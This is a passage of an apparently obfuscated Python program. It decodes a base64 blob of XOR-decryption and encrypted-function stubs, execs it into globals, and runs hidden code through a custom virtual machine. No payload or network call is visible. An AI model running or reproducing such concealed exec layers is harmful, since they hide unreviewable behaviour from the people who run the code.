QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuYXBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncykKCmRlZiBfZigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZygqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygzLCBfRlVOQ19LRVksICdfZycsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _ovnfaj()
